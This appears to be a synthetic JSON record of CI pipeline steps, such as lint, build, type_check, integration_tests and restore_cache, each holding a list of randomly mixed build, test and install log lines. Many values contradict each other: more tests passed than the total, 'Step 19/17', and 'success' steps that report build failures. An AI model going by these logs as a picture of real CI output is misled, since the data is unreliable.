          "[12:19:25] WARN: Deprecated API usage",
          "Finished.",
          "Test Suites: 24 passed, 6 total",
          "\u2717 build failed with exit code 101",
          "Compiling utils/service.java...",
          "Tests: 237 passed, 426 total",
          "Done.",
          "Cache restored successfully (187MB)",
          "[12:19:25] INFO: Starting build process",
          "Using Node.js 15.8.9",
          "Step 2/23: Linting",
          "pip: Collecting lodash",
          "Minifying main.js",
          "Coverage: 92% statements, 79% branches",
          "Compiling lib/utils.go...",
          "[12:19:25] WARN: Deprecated API usage",
          "Compiling utils/main.py...",
          "Transforming 597 files...",
          "Processing...",
          "pip: Installing build dependencies...",
          "Connecting to startup.dev:443...",
          "Connection established",
          "Fetching submodules...",
          "Connection established",
          "Step 6/22: Linting",
          "Artifact downloaded: 20MB",
          "\u2713 All checks passed",
          "pip install: Successfully installed eslint-4.5",
          "OK",
          "Compiling src/index.js...",
          "Checking out develop branch",
          "Exception: TypeError",
          "Environment: production",
          "Finished.",
          "Connection established",
          "Cache restored successfully (196MB)",
          "  PASS: e2e/test_api_health.spec.js",
          "yarn add: Done in 8.77s",
          "POST /upload - 201 (168ms)",
          "Installing eslint@1.16.9",
          "Pushing to registry...",
          "Connecting to startup.dev:443...",
          "pip: Downloading prettier-3.1.tar.gz",
          "pip: Installing build dependencies...",
          "\u2717 build failed with exit code 73",
          "Loading...",
          "Cache restored successfully (488MB)",
          "\u2713 Step 'checkout' succeeded",
          "Checking out main branch",
          "Compiling lib/utils.go...",
          "Cache saved successfully",
          "Fetching submodules...",
          "HEAD is now at ea3fe69",
          "Fetching submodules...",
          "Tests: 91 passed, 392 total",
          "Fetching submodules...",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-07T12:19:36.297717",
        "finished_at": "2025-12-07T12:19:46.972698",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "Using Node.js 15.3.7",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Using Node.js 15.7.6",
          "pip: Installing build dependencies...",
          "Fetching submodules...",
          "[12:19:25] DEBUG: Initializing service",
          "Step 7/23: Deploying",
          "[12:19:25] ERROR: Connection failed",
          "  PASS: e2e/test_auth_login.spec.js",
          "Transforming 117 files...",
          "pip install: Successfully installed lodash-3.7",
          "Minifying vendor.js",
          "Processing...",
          "Platform: linux-x64",
          "npm notice: created a lockfile",
          "yarn add: Done in 10.70s",
          "Compiling utils/utils.go...",
          "Snapshots: 29 passed, 7 total",
          "[12:19:25] INFO: Connecting to database",
          "\u2713 Step 'checkout' succeeded",
          "Pushing to registry...",
          "pip install: Successfully installed axios-3.17",
          "FAILED: test_api_health",
          "Cache invalidated: node_modules",
          "WARNING: lodash has known vulnerabilities",
          "Step 7/20: Linting",
          "Verifying...",
          "TLS handshake completed",
          "Optimizing 45 modules...",
          "Pushing to registry...",
          "\u2713 All checks passed",
          "yarn add: Done in 16.72s",
          "Installing jest@5.4.5",
          "Tests: 246 passed, 235 total",
          "Step 1/19: Running migrations",
          "Ran 77 tests in 55s",
          "yarn add: Done in 9.4s",
          "Building Docker image...",
          "Bundling styles.js",
          "Transforming 859 files...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache invalidated: dependencies",
          "Step 17/25: Building",
          "[12:19:25] INFO: Connecting to database",
          "pip install: Successfully installed eslint-1.7",
          "Artifact uploaded: build.tar.gz (30MB)",
          "npm install: resolved 1913 packages",
          "Ran 56 tests in 59s",
          "Compiling src/utils.go...",
          "Minifying app.js",
          "Step 20/23: Testing",
          "npm notice: created a lockfile",
          "Step 7/24: Building",
          "Optimizing 55 modules...",
          "Time: 21.745s",
          "Compiling components/main.py...",
          "Platform: linux-x64",
          "Using Python 3.10",
          "GET /health - 201 (20ms)",
          "[12:19:25] INFO: Request completed",
          "Cache invalidated: build",
          "Completed.",
          "Pulling image: node:3.11",
          "\u2713 package completed",
          "[12:19:25] DEBUG: Loading configuration",
          "Snapshots: 6 passed, 36 total",
          "pip: Collecting eslint",
          "Connection established",
          "Bundling main.js",
          "\u2717 build failed with exit code 19",
          "Cache hit for key-8070",
          "pip: Collecting webpack",
          "POST /api - 202 (140ms)",
          "\u2717 build failed with exit code 103",
          "Fetching submodules...",
          "Exception: TypeError",
          "Compiling utils/index.js...",
          "\u2713 Task completed in 4121ms",
          "Fetching submodules...",
          "Loading...",
          "Connection established",
          "Artifact uploaded: dist.zip (52MB)",
          "Step 20/23: Running migrations",
          "[12:19:25] DEBUG: Memory usage: 1902MB",
          "Loading...",
          "[12:19:25] INFO: Starting build process",
          "Ran 154 tests in 5s",
          "[12:19:25] DEBUG: Connection pool: 2 active",
          "Artifact uploaded: dist.zip (45MB)",
          "Done.",
          "pip: Collecting eslint",
          "Compiling utils/handler.rs...",
          "Compiling utils/app.ts...",
          "[12:19:25] WARN: Deprecated API usage",
          "Cache saved successfully",
          "[12:19:25] DEBUG: Memory usage: 186MB",
          "  PASS: test_auth_login (396ms)",
          "pip: Collecting webpack",
          "Creating production build...",
          "Cache hit for key-4821",
          "npm install: resolved 1512 packages",
          "Building Docker image...",
          "Transforming 407 files...",
          "Artifact uploaded: dist.zip (2MB)",
          "Compiling lib/handler.rs...",
          "[12:19:25] DEBUG: Loading configuration",
          "Using Node.js 15.4.5",
          "WARNING: lodash has known vulnerabilities",
          "WARNING: prettier has known vulnerabilities",
          "npm notice: package.json updated",
          "Cache miss for key-3991",
          "  PASS: integration/test_user_create.spec.js",
          "pip: Collecting express",
          "Completed.",
          "npm install: resolved 362 packages",
          "Platform: win32-x64",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:19:25] INFO: Cache refreshed",
          "GET /api - 200 (78ms)",
          "Already up to date.",
          "FAILED: test_auth_login",
          "Generating source maps...",
          "Done.",
          "Installing eslint@1.0.2",
          "Step 7/16: Installing dependencies",
          "Finished.",
          "Transforming 110 files...",
          "Environment: test",
          "Step 12/19: Deploying",
          "Time: 45.329s",
          "Checking out main branch",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-07T12:19:46.972698",
        "finished_at": "2025-12-07T12:19:57.647679",
        "log_lines": [
          "=== Step: setup_node ===",
          "Ready.",
          "Done.",
          "npm install: added 27 packages",
          "Success!",
          "pip install: Successfully installed axios-2.2",
          "[12:19:25] DEBUG: Query executed in 86ms",
          "Optimizing 69 modules...",
          "pip: Installing build dependencies...",
          "Verifying...",
          "POST /data - 202 (483ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Connecting to cloud.services:443...",
          "[12:19:25] ERROR: Connection failed",
          "Image pulled successfully",
          "Step 6/20: Installing dependencies",
          "Cache miss for key-8034",
          "Layer 3/8: ENV command",
          "WARNING: express has known vulnerabilities",
          "[12:19:25] INFO: Starting build process",
          "[12:19:25] DEBUG: Loading configuration",
          "Step 15/20: Building",
          "npm notice: package.json updated",
          "WARNING: axios has known vulnerabilities",
          "Processing...",
          "Cache saved successfully",
          "Processing...",
          "Done.",
          "[12:19:25] WARN: Deprecated API usage",
          "\u2713 All checks passed",
          "Switched to branch 'bugfix/task-370'",
          "[12:19:25] DEBUG: Connection pool: 17 active",
          "Artifact uploaded: dist.zip (25MB)",
          "[12:19:25] DEBUG: Loading configuration",
          "Switched to branch 'bugfix/task-229'",
          "Artifact uploaded: dist.zip (10MB)",
          "POST /data - 201 (230ms)",
          "Cache saved successfully",
          "Compiling utils/app.ts...",
          "Artifact uploaded: build.tar.gz (31MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "POST /data - 200 (374ms)",
          "Compiling lib/handler.rs...",
          "Loading...",
          "Artifact downloaded: 49MB",
          "Cache miss for key-8169",
          "Using Node.js 18.14.1",
          "FAILED: test_api_health",
          "HEAD is now at 56474d7",
          "Step 4/24: Deploying",
          "[12:19:25] WARN: Deprecated API usage",
          "NODE_ENV=production",
          "Finished.",
          "Platform: linux-x64",
          "WARNING: jest has known vulnerabilities",
          "Step 3/17: Testing",
          "Connection established",
          "Finished.",
          "\u2717 build failed with exit code 59",
          "[12:19:25] INFO: Starting build process",
          "[12:19:25] INFO: Request completed",
          "Completed.",
          "pip install: Successfully installed react-3.12",
          "[12:19:25] ERROR: Connection failed",
          "yarn add: Done in 16.13s",
          "Connecting to startup.dev:443...",
          "npm install: resolved 384 packages",
          "Ready.",
          "Cache miss for key-2911",
          "Pulling image: node:latest",
          "Compiling src/app.ts...",
          "[12:19:25] DEBUG: Query executed in 2ms",
          "Cache restored successfully (447MB)",
          "Connecting to test.io:443...",
          "Artifact downloaded: 25MB",
          "pip: Installing build dependencies...",
          "Connecting to cloud.services:443...",
          "[12:19:25] DEBUG: Loading configuration",
          "Platform: win32-x64",
          "Loading...",
          "WARNING: express has known vulnerabilities",
          "Already up to date.",
          "Platform: win32-x64",
          "Connecting to cloud.services:443...",
          "pip: Installing build dependencies...",
          "Artifact downloaded: 47MB",
          "npm install: added 390 packages",
          "Connecting to test.io:443...",
          "Pulling image: alpine:18",
          "pip: Installing build dependencies...",
          "Uploading artifact 'dist' (37 files)",
          "Layer 9/12: COPY command",
          "Checking out master branch",
          "\u2713 test completed",
          "WARNING: jest has known vulnerabilities",
          "  PASS: test_auth_login (320ms)",
          "Using Python 3.11",
          "Cache restored successfully (146MB)",
          "npm notice: created a lockfile",
          "Compiling lib/main.py...",
          "WARNING: axios has known vulnerabilities",
          "Switched to branch 'hotfix/task-364'",
          "yarn add: Done in 23.61s",
          "[12:19:25] WARN: Deprecated API usage",
          "Artifact downloaded: 39MB",
          "Pushing to registry...",
          "[12:19:25] INFO: Processing request",
          "WARNING: prettier has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 lint completed",
          "npm install: added 234 packages",
          "Success!",
          "Compiling src/main.py...",
          "Compiling utils/utils.go...",
          "Processing...",
          "WARNING: eslint has known vulnerabilities",
          "HEAD is now at 9ede422",
          "pip: Collecting axios",
          "Time: 71.801s",
          "Layer 3/13: RUN command",
          "[12:19:25] INFO: Starting build process",
          "Step 13/17: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Minifying main.js",
          "Platform: win32-x64",
          "Installing eslint@4.7.2",
          "pip: Downloading jest-2.18.tar.gz",
          "Step 1/16: Installing dependencies",
          "Connection established",
          "npm install: added 205 packages",
          "pip: Downloading jest-4.11.tar.gz",
          "Transforming 171 files...",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-07T12:19:57.647679",
        "finished_at": "2025-12-07T12:20:29.672621",
        "log_lines": [
          "=== Step: build ===",
          "Platform: linux-x64",
          "Layer 8/10: RUN command",
          "npm notice: created a lockfile",
          "GET /health - 204 (29ms)",
          "Generating source maps...",
          "Platform: win32-x64",
          "Pulling image: node:latest",
          "[12:19:25] INFO: Processing request",
          "Optimizing 12 modules...",
          "Coverage: 74% statements, 80% branches",
          "Environment: staging",
          "Verifying...",
          "Step 14/21: Running migrations",
          "[12:19:25] ERROR: Connection failed",
          "Compiling lib/index.js...",
          "[12:19:25] DEBUG: Connection pool: 19 active",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Ran 18 tests in 53s",
          "Ready.",
          "Compiling lib/index.js...",
          "Using Node.js 19.1.6",
          "Pulling image: python:latest",
          "Environment: test",
          "[12:19:25] DEBUG: Query executed in 49ms",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 All checks passed",
          "Step 13/20: Building",
          "Optimizing 42 modules...",
          "GET /health - 201 (62ms)",
          "Step 7/15: Deploying",
          "Time: 16.327s",
          "Installing prettier@3.11.9",
          "Cache saved successfully",
          "[12:19:25] DEBUG: Loading configuration",
          "[12:19:25] DEBUG: Memory usage: 847MB",
          "GET /api - 200 (95ms)",
          "[12:19:25] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "pip: Collecting jest",
          "FAILED: test_cache_hit",
          "[12:19:25] WARN: Deprecated API usage",
          "Cache restored successfully (321MB)",
          "Step 16/18: Building",
          "Artifact uploaded: dist.zip (54MB)",
          "Verifying...",
          "GET /health - 200 (60ms)",
          "Building Docker image...",
          "Transforming 340 files...",
          "npm install: added 478 packages",
          "Layer 10/11: COPY command",
          "Cache hit for key-4126",
          "Optimizing 86 modules...",
          "Compiling components/main.py...",
          "\u2713 All checks passed",
          "Step 18/25: Deploying",
          "pip: Installing build dependencies...",
          "POST /api - 201 (329ms)",
          "Loading...",
          "[12:19:25] INFO: Connecting to database",
          "[12:19:25] WARN: Deprecated API usage",
          "npm notice: created a lockfile",
          "Exception: TypeError",
          "pip: Collecting eslint",
          "GET /status - 201 (59ms)",
          "Tests: 425 passed, 392 total",
          "Step 10/20: Building",
          "Cache saved successfully",
          "[12:19:25] DEBUG: Query executed in 9ms",
          "\u2713 Task completed in 3714ms",
          "Installing webpack@3.1.9",
          "Minifying main.js",
          "npm install: added 289 packages",
          "npm install: added 426 packages",
          "Done.",
          "[12:19:25] DEBUG: Loading configuration",
          "pip: Collecting axios",
          "\u2713 lint completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Processing...",
          "npm install: resolved 607 packages",
          "Completed.",
          "[12:19:25] INFO: Cache refreshed",
          "Artifact downloaded: 34MB",
          "[12:19:25] INFO: Connecting to database",
          "pip: Installing build dependencies...",
          "OK",
          "Fetching submodules...",
          "Compiling utils/main.py...",
          "Compiling lib/utils.go...",
          "npm install: resolved 1595 packages",
          "Tests: 59 passed, 82 total",
          "Step 6/18: Installing dependencies",
          "npm notice: created a lockfile",
          "[12:19:25] INFO: Starting build process",
          "[12:19:25] DEBUG: Query executed in 97ms",
          "Artifact uploaded: dist.zip (90MB)",
          "Step 14/20: Linting",
          "[12:19:25] DEBUG: Connection pool: 16 active",
          "Using Python 3.11",
          "WARNING: jest has known vulnerabilities",
          "pip: Collecting webpack",
          "Fetching submodules...",
          "Step 11/15: Linting",
          "pip: Collecting webpack",
          "Step 12/23: Linting",
          "npm notice: created a lockfile",
          "Bundling main.css",
          "\u2713 Step 'install' succeeded",
          "Step 11/24: Running migrations",
          "Environment: staging",
          "Building Docker image...",
          "Using Python 3.9",
          "[12:19:25] DEBUG: Memory usage: 1623MB",
          "Using Python 3.12",
          "[12:19:25] DEBUG: Connection pool: 20 active",
          "Layer 3/8: ENV command",
          "pip: Installing build dependencies...",
          "[12:19:25] INFO: Connecting to database",
          "npm install: added 87 packages",
          "Artifact downloaded: 13MB",
          "Test Suites: 34 passed, 9 total",
          "[12:19:25] DEBUG: Query executed in 70ms",
          "\u2713 All checks passed",
          "Coverage: 88% statements, 89% branches",
          "Exception: TypeError",
          "npm notice: package.json updated",
          "\u2713 lint completed",
          "Step 19/17: Linting",
          "Connecting to test.io:443...",
          "Step 3/19: Installing dependencies",
          "Done.",
          "yarn add: Done in 4.95s",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-07T12:20:29.672621",
        "finished_at": "2025-12-07T12:20:40.347602",
        "log_lines": [
          "=== Step: type_check ===",
          "Compiling utils/service.java...",
          "Artifact uploaded: build.tar.gz (18MB)",
          "TLS handshake completed",
          "\u2717 build failed with exit code 36",
          "\u2713 Step 'setup' succeeded",
          "Verifying...",
          "Step 5/22: Deploying",
          "Artifact downloaded: 2MB",
          "Loading...",
          "[12:19:25] WARN: Deprecated API usage",
          "npm install: added 485 packages",
          "Loading...",
          "Fetching submodules...",
          "\u2713 All checks passed",
          "pip: Installing build dependencies...",
          "[12:19:25] INFO: Request completed",
          "[12:19:25] DEBUG: Loading configuration",
          "pip: Installing build dependencies...",
          "Creating production build...",
          "Step 16/21: Building",
          "npm notice: created a lockfile",
          "Ran 116 tests in 18s",
          "\u2713 All checks passed",
          "FAILED: test_cache_hit",
          "Tests: 395 passed, 401 total",
          "[12:19:25] DEBUG: Connection pool: 20 active",
          "Compiling lib/service.java...",
          "Step 13/25: Running migrations",
          "[12:19:25] INFO: Connecting to database",
          "[12:19:25] INFO: Request completed",
          "npm notice: created a lockfile",
          "Artifact downloaded: 43MB",
          "WARNING: react has known vulnerabilities",
          "Cache miss for key-9173",
          "npm install: added 22 packages",
          "Exception: ValueError",
          "pip: Collecting express",
          "Finished.",
          "GET /api - 201 (94ms)",
          "npm notice: created a lockfile",
          "Image pulled successfully",
          "WARNING: lodash has known vulnerabilities",
          "pip: Collecting eslint",
          "[12:19:25] DEBUG: Initializing service",
          "Platform: win32-x64",
          "Checking out main branch",
          "Switched to branch 'bugfix/task-425'",
          "Fetching submodules...",
          "Transforming 444 files...",
          "WARNING: lodash has known vulnerabilities",
          "Using Node.js 19.11.0",
          "Cache invalidated: node_modules",
          "Checking out develop branch",
          "npm notice: package.json updated",
          "Cache invalidated: dependencies",
          "HEAD is now at 465e3d7",
          "Compiling components/app.ts...",
          "Cache saved successfully",
          "Ran 128 tests in 17s",
          "Minifying vendor.js",
          "Installing eslint@2.2.4",
          "[12:19:25] WARN: Deprecated API usage",
          "GET /status - 200 (99ms)",
          "Fetching submodules...",
          "[12:19:25] INFO: Connecting to database",
          "Cache saved successfully",
          "Transforming 337 files...",
          "Step 18/23: Building",
          "Switched to branch 'feature/task-418'",
          "OK",
          "Step 9/17: Building",
          "Compiling utils/service.java...",
          "  PASS: test_db_connect (475ms)",
          "[12:19:25] WARN: Deprecated API usage",
          "Cache miss for key-5090",
          "Step 5/23: Building",
          "Test Suites: 18 passed, 26 total",
          "Cache invalidated: node_modules",
          "Creating production build...",
          "npm notice: created a lockfile",
          "\u2713 build completed",
          "  PASS: integration/test_db_connect.spec.js",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Creating production build...",
          "npm install: resolved 1609 packages",
          "Generating source maps...",
          "[12:19:25] DEBUG: Connection pool: 20 active",
          "Switched to branch 'bugfix/task-483'",
          "\u2713 Step 'build' succeeded",
          "Coverage: 93% statements, 76% branches",
          "POST /upload - 200 (142ms)",
          "Building Docker image...",
          "yarn add: Done in 12.87s",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Loading...",
          "\u2713 Step 'test' succeeded",
          "Step 19/15: Linting",
          "Compiling components/main.py...",
          "Step 7/15: Installing dependencies",
          "Connecting to test.io:443...",
          "Using Node.js 14.4.5",
          "Using Python 3.11",
          "npm install: added 393 packages",
          "Step 15/17: Deploying",
          "[12:19:25] INFO: Cache refreshed",
          "Optimizing 61 modules...",
          "HEAD is now at fa03270",
          "Transforming 695 files...",
          "Layer 4/15: ENV command",
          "Already up to date.",
          "\u2713 Step 'build' succeeded",
          "Step 7/23: Testing",
          "[12:19:25] DEBUG: Initializing service",
          "Environment: staging",
          "Processing...",
          "npm notice: package.json updated",
          "Step 11/25: Building",
          "Connection established",
          "[12:19:25] DEBUG: Memory usage: 1327MB",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Installing react@3.15.0",
          "Waiting...",
          "Step 4/21: Building",
          "[12:19:25] WARN: Deprecated API usage",
          "Using Node.js 20.13.0",
          "Building Docker image...",
          "Connecting to test.io:443...",
          "Step 8/24: Linting",
          "Compiling utils/utils.go...",
          "Layer 10/10: COPY command",
          "Exception: ValueError",
          "Layer 9/14: COPY command",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-07T12:20:40.347602",
        "finished_at": "2025-12-07T12:21:01.697563",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Bundling main.css",
          "Cache restored successfully (179MB)",
          "Uploading artifact 'dist' (19 files)",
          "Step 19/15: Testing",
          "Compiling src/handler.rs...",
          "[12:19:25] ERROR: Connection failed",
          "TLS handshake completed",
          "[12:19:25] DEBUG: Loading configuration",
          "Test Suites: 10 passed, 16 total",
          "\u2717 build failed with exit code 71",
          "[12:19:25] INFO: Connecting to database",
          "HEAD is now at 12b45e6",
          "Step 8/18: Linting",
          "pip: Installing build dependencies...",
          "Building Docker image...",
          "Building Docker image...",
          "\u2713 lint completed",
          "Step 4/23: Testing",
          "Creating production build...",
          "Using Node.js 19.19.9",
          "pip: Installing build dependencies...",
          "WARNING: eslint has known vulnerabilities",
          "Artifact downloaded: 11MB",
          "Step 15/17: Running migrations",
          "Bundling vendor.css",
          "npm notice: package.json updated",
          "OK",
          "  PASS: e2e/test_api_health.spec.js",
          "Tests: 296 passed, 379 total",
          "Exception: RuntimeError",
          "Ran 31 tests in 23s",
          "\u2717 build failed with exit code 111",
          "pip install: Successfully installed prettier-2.18",
          "Cache saved successfully",
          "Minifying app.js",
          "Creating production build...",
          "Using Node.js 19.1.1",
          "Minifying app.js",
          "Platform: linux-x64",
          "  PASS: unit/test_user_create.spec.js",
          "POST /upload - 200 (371ms)",
          "[12:19:25] DEBUG: Connection pool: 17 active",
          "[12:19:25] DEBUG: Loading configuration",
          "  PASS: integration/test_user_create.spec.js",
          "pip: Downloading axios-2.9.tar.gz",
          "Step 3/24: Building",
          "\u2713 Step 'setup' succeeded",
          "Time: 50.505s",
          "POST /data - 200 (402ms)",
          "pip: Collecting lodash",
          "[12:19:25] WARN: Deprecated API usage",
          "Done.",
          "Already up to date.",
          "\u2713 Task completed in 2884ms",
          "npm notice: created a lockfile",
          "Minifying app.js",
          "TLS handshake completed",
          "  PASS: test_user_create (50ms)",
          "\u2713 Task completed in 2525ms",
          "NODE_ENV=development",
          "Installing eslint@3.17.2",
          "[12:19:25] INFO: Connecting to database",
          "pip: Installing build dependencies...",
          "[12:19:25] INFO: Processing request",
          "FAILED: test_cache_hit",
          "Waiting...",
          "npm install: resolved 1688 packages",
          "Artifact uploaded: dist.zip (9MB)",
          "  PASS: integration/test_user_create.spec.js",
          "npm notice: created a lockfile",
          "Minifying main.js",
          "Image pulled successfully",
          "Loading...",
          "WARNING: eslint has known vulnerabilities",
          "npm notice: package.json updated",
          "Finished.",
          "pip: Downloading jest-5.5.tar.gz",
          "Pulling image: alpine:latest",
          "Completed.",
          "Fetching submodules...",
          "Cache saved successfully",
          "Done.",
          "Connecting to startup.dev:443...",
          "Installing webpack@1.12.3",
          "Snapshots: 39 passed, 30 total",
          "yarn add: Done in 18.96s",
          "\u2713 Step 'test' succeeded",
          "[12:19:25] INFO: Cache refreshed",
          "TLS handshake completed",
          "WARNING: lodash has known vulnerabilities",
          "[12:19:25] INFO: Request completed",
          "[12:19:25] INFO: Cache refreshed",
          "[12:19:25] INFO: Processing request",
          "[12:19:25] ERROR: Connection failed",
          "Minifying main.js",
          "POST /api - 200 (139ms)",
          "[12:19:25] DEBUG: Loading configuration",
          "Completed.",
          "Step 15/16: Linting",
          "  PASS: integration/test_cache_hit.spec.js",
          "\u2713 All checks passed",
          "Pulling image: python:3.11",
          "Connection established",
          "Fetching submodules...",
          "Exception: NullPointerException",
          "Installing express@3.17.4",
          "[12:19:25] DEBUG: Connection pool: 4 active",
          "Success!",
          "Fetching submodules...",
          "Coverage: 97% statements, 66% branches",
          "Cache invalidated: build",
          "Image pulled successfully",
          "POST /api - 201 (371ms)",
          "[12:19:25] INFO: Connecting to database",
          "WARNING: react has known vulnerabilities",
          "Step 11/20: Linting",
          "pip install: Successfully installed axios-4.6",
          "OK",
          "\u2713 Step 'checkout' succeeded",
          "OK",
          "Step 16/19: Deploying",
          "Step 11/24: Deploying",
          "Step 11/24: Testing",
          "Optimizing 71 modules...",
          "  PASS: e2e/test_db_connect.spec.js",
          "Loading...",
          "Layer 6/9: RUN command",
          "Pushing to registry...",
          "Image pulled successfully",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Platform: darwin-arm64",
          "Image pulled successfully",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-07T12:21:01.697563",
        "finished_at": "2025-12-07T12:21:08.102551",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Optimizing 70 modules...",
          "[12:19:25] WARN: Deprecated API usage",
          "npm install: added 194 packages",
          "Waiting...",
          "Step 12/20: Installing dependencies",
          "Pulling image: node:18",
          "[12:19:25] DEBUG: Initializing service",
          "Using Python 3.9",
          "\u2717 build failed with exit code 1",
          "npm install: added 278 packages",
          "Cache restored successfully (377MB)",
          "Tests: 172 passed, 177 total",
          "Ran 184 tests in 53s",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache restored successfully (327MB)",
          "Building Docker image...",
          "Cache miss for key-4993",
          "[12:19:25] DEBUG: Query executed in 23ms",
          "[12:19:25] INFO: Cache refreshed",
          "pip install: Successfully installed express-2.13",
          "Transforming 509 files...",
          "Cache restored successfully (399MB)",
          "Processing...",
          "GET /api - 201 (65ms)",
          "Layer 8/11: ENV command",
          "pip: Installing build dependencies...",
          "[12:19:25] INFO: Processing request",
          "Ready.",
          "Step 9/20: Testing",
          "Waiting...",
          "Artifact downloaded: 9MB",
          "Building Docker image...",
          "npm notice: package.json updated",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Snapshots: 20 passed, 42 total",
          "Done.",
          "Optimizing 51 modules...",
          "npm install: resolved 1638 packages",
          "Tests: 174 passed, 442 total",
          "HEAD is now at 1bde9a3",
          "POST /data - 201 (390ms)",
          "npm install: added 186 packages",
          "Uploading artifact 'build' (15 files)",
          "\u2713 All checks passed",
          "npm install: resolved 1079 packages",
          "Step 13/15: Deploying",
          "Building Docker image...",
          "Step 15/21: Linting",
          "Layer 10/10: ENV command",
          "Artifact downloaded: 31MB",
          "\u2717 build failed with exit code 63",
          "Exception: TypeError",
          "Loading...",
          "Step 18/18: Linting",
          "  PASS: test_user_create (436ms)",
          "Switched to branch 'bugfix/task-113'",
          "Finished.",
          "Platform: linux-x64",
          "[12:19:25] DEBUG: Memory usage: 1741MB",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "NODE_ENV=test",
          "Waiting...",
          "Tests: 194 passed, 424 total",
          "[12:19:25] INFO: Processing request",
          "npm notice: package.json updated",
          "pip: Collecting webpack",
          "Snapshots: 9 passed, 22 total",
          "Step 3/17: Building",
          "[12:19:25] INFO: Cache refreshed",
          "Compiling src/handler.rs...",
          "[12:19:25] INFO: Cache refreshed",
          "Success!",
          "Step 20/23: Running migrations",
          "Cache hit for key-8265",
          "Compiling lib/main.py...",
          "Cache restored successfully (290MB)",
          "Transforming 887 files...",
          "Environment: staging",
          "Switched to branch 'hotfix/task-275'",
          "Ready.",
          "pip: Collecting lodash",
          "Step 7/15: Running migrations",
          "[12:19:25] INFO: Cache refreshed",
          "Tests: 160 passed, 340 total",
          "Loading...",
          "Cache hit for key-1520",
          "Cache invalidated: dependencies",
          "Test Suites: 23 passed, 16 total",
          "Ran 23 tests in 14s",
          "Transforming 189 files...",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Connection established",
          "Snapshots: 33 passed, 25 total",
          "Artifact downloaded: 44MB",
          "Environment: production",
          "Exception: ValueError",
          "Ran 37 tests in 57s",
          "Exception: RuntimeError",
          "[12:19:25] INFO: Connecting to database",
          "[12:19:25] INFO: Starting build process",
          "Already up to date.",
          "npm notice: package.json updated",
          "\u2717 build failed with exit code 26",
          "Ran 162 tests in 47s",
          "Snapshots: 36 passed, 23 total",
          "npm notice: created a lockfile",
          "Ready.",
          "Compiling components/main.py...",
          "Connecting to startup.dev:443...",
          "pip: Collecting axios",
          "Compiling lib/utils.go...",
          "[12:19:25] DEBUG: Query executed in 49ms",
          "Generating source maps...",
          "Finished.",
          "Verifying...",
          "Completed.",
          "pip: Downloading lodash-2.19.tar.gz",
          "[12:19:25] INFO: Cache refreshed",
          "Cache saved successfully",
          "Creating production build...",
          "[12:19:25] INFO: Connecting to database",
          "Compiling lib/utils.go...",
          "Uploading artifact 'build' (3 files)",
          "Checking out main branch",
          "Tests: 286 passed, 343 total",
          "Layer 8/11: RUN command",
          "[12:19:25] DEBUG: Initializing service",
          "Completed.",
          "Step 1/22: Testing",
          "Generating source maps...",
          "\u2713 deploy completed",
          "Building Docker image...",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-07T12:21:08.102551",
        "finished_at": "2025-12-07T12:21:40.127493",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Generating source maps...",
          "Cache miss for key-9157",
          "[12:19:25] INFO: Starting build process",
          "\u2713 All checks passed",
          "FAILED: test_auth_login",
          "Already up to date.",
          "Waiting...",
          "Finished.",
          "Ready.",
          "pip: Collecting jest",
          "pip install: Successfully installed jest-1.17",
          "Optimizing 94 modules...",
          "Installing webpack@1.5.10",
          "Bundling styles.js",
          "Installing express@2.12.1",
          "[12:19:25] DEBUG: Connection pool: 8 active",
          "WARNING: lodash has known vulnerabilities",
          "[12:19:25] WARN: Deprecated API usage",
          "Transforming 936 files...",
          "Ran 19 tests in 17s",
          "Step 4/25: Testing",
          "Processing...",
          "Artifact downloaded: 3MB",
          "Test Suites: 20 passed, 34 total",
          "Environment: development",
          "[12:19:25] WARN: Deprecated API usage",
          "Finished.",
          "Step 9/25: Testing",
          "[12:19:25] ERROR: Connection failed",
          "Already up to date.",
          "Artifact uploaded: build.tar.gz (47MB)",
          "[12:19:25] INFO: Starting build process",
          "Verifying...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 Task completed in 3287ms",
          "Cache invalidated: node_modules",
          "  PASS: test_auth_login (470ms)",
          "Installing prettier@5.9.6",
          "Image pulled successfully",
          "WARNING: eslint has known vulnerabilities",
          "\u2713 All checks passed",
          "Artifact uploaded: dist.zip (88MB)",
          "Verifying...",
          "\u2713 Task completed in 2251ms",
